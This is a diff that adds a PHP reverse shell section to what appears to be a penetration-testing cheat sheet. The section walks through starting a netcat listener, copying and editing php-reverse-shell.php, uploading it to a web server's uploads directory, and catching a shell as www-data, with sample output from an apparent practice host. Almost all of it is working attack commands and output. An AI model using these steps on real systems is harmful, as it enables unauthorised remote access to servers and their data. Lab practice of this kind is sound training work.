@@ -199,3 +199,36 @@ Research your target OS fully
     whoami
     www-data
     ```
+
+* PHP Reverse Shell
+    Local listener
+    ```
+    nc -nvlp 1234
+    listening on [any] 1234 ...
+    ```
+    Grab local copy of php-reverse-shell.php
+    ```
+    cp /usr/share/webshells/php/php-reverse-shell.php .
+    ```
+    Edit the $ip and $port lines
+    ```
+    $ip = '127.0.0.1';  // CHANGE THIS
+    $port = 1234;       // CHANGE THIS
+    ```
+    Upload php-reverse-shell.php and navigate to the URL
+    ```
+    http://a.b.c.d/uploads/php-reverse-shell.php
+    ```
+    Check your listener
+    ```
+    nc -nvlp 1234
+    listening on [any] 1234 ...
+    connect to [e.f.g.h] from (UNKNOWN) [a.b.c.d] 39426
+    Linux linux-shell-practice 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+    00:08:40 up 3 min,  0 users,  load average: 0.08, 0.15, 0.07
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    /bin/sh: 0: can't access tty; job control turned off
+    $ whoami
+    www-data
+    ```
